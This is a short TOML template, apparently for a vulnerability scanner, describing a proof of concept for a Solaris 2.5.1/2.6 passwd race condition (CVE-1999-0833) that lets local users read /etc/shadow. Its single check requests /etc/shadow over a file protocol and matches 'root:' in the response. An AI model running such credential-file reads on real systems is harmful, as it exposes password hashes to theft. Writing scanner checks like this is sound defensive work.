[info]
author = "ave"
description = "Solaris 2.5.1 and 2.6 passwd race condition allows local users to read /etc/shadow"
id = "POC-AVE-1999-0618"
name = "PoC for AVE-1999-0618 (CVE-1999-0833)"
severity = "medium"
tags = [
    "ave-1999-0618",
    "cve-1999-0833",
    "solaris",
    "local-file-read",
]
vuln_id = [
    "CVE-1999-0833",
    "AVE-1999-0618",
]

[poc]
logic = "all"

[[poc.requests]]
path = "/etc/shadow"
protocol = "file"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
